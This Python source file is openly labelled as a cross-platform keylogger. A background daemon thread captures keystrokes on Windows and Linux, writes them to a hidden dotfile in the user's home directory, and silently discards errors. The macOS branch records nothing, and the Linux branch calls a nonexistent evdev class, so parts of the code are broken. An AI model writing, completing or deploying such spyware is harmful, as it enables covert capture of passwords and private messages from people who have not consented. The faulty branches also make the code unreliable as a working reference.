"""Keylogger — cross-platform keystroke capture."""

import os
import sys
import time
import threading
import platform


class Keylogger:
    def __init__(self, log_file: str = None):
        self.log_file = log_file or os.path.join(os.path.expanduser("~"), ".vx_keylog.txt")
        self.running = False
        self._thread = None

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False

    def get_log(self) -> str:
        try:
            with open(self.log_file, "r", errors="replace") as f:
                return f.read()
        except Exception:
            return ""

    def clear_log(self):
        try:
            open(self.log_file, "w").close()
        except Exception:
            pass

    def _run(self):
        system = platform.system()
        if system == "Windows":
            self._windows_loop()
        elif system == "Linux":
            self._linux_loop()
        elif system == "Darwin":
            self._macos_loop()

    def _log(self, text: str):
        try:
            with open(self.log_file, "a") as f:
                f.write(text)
        except Exception:
            pass

    def _windows_loop(self):
        try:
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            def get_key():
                for key in range(8, 192):
                    if user32.GetAsyncKeyState(key) & 0x8000:
                        return key
                return None

            SPECIAL = {
                8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]",
                20: "[CAPS]", 27: "[ESC]", 32: " ",
                33: "[PGUP]", 34: "[PGDN]", 35: "[END]", 36: "[HOME]",
                37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
                46: "[DEL]", 91: "[LWIN]", 92: "[RWIN]",
            }

            while self.running:
                key = get_key()
                if key is not None:
                    if key in SPECIAL:
                        self._log(SPECIAL[key])
                    elif 48 <= key <= 57:
                        self._log(chr(key))
                    elif 65 <= key <= 90:
                        shift = user32.GetAsyncKeyState(16) & 0x8000
                        char = chr(key).lower()
                        if shift:
                            char = char.upper()
                        self._log(char)
                    elif 96 <= key <= 105:
                        self._log(str(key - 96))
                    else:
                        self._log(f"[{key}]")
                time.sleep(0.01)
        except Exception:
            pass

    def _linux_loop(self):
        try:
            import evdev
            from evdev import UInput, ecodes

            devices = [evdev.InputFile(p) for p in evdev.list_devices()]
            if not devices:
                return

            key_map = {
                ecodes.KEY_SPACE: " ", ecodes.KEY_ENTER: "[ENTER]",
                ecodes.KEY_BACKSPACE: "[BS]", ecodes.KEY_TAB: "[TAB]",
                ecodes.KEY_ESC: "[ESC]", ecodes.KEY_DELETE: "[DEL]",
            }

            while self.running:
                for device in devices:
                    try:
                        for event in device.read():
                            if event.type == ecodes.EV_KEY and event.value == 1:
                                key = ecodes.KEY[event.code]
                                self._log(key_map.get(event.code, key.replace("KEY_", "").lower()))
                    except Exception:
                        continue
                time.sleep(0.01)
        except Exception:
            pass

    def _macos_loop(self):
        try:
            from Quartz import CGEventSourceCreate, kCGEventSourceStateCombinedSession
            from Quartz import CGEventCreateKeyboardEvent, CGEventGetFlags, kCGEventFlagMaskAlternate
            import AppKit

            last_flags = 0
            while self.running:
                try:
                    flags = CGEventGetFlags(None)
                    if flags != last_flags:
                        last_flags = flags
                except Exception:
                    pass
                time.sleep(0.05)
        except Exception:
            pass
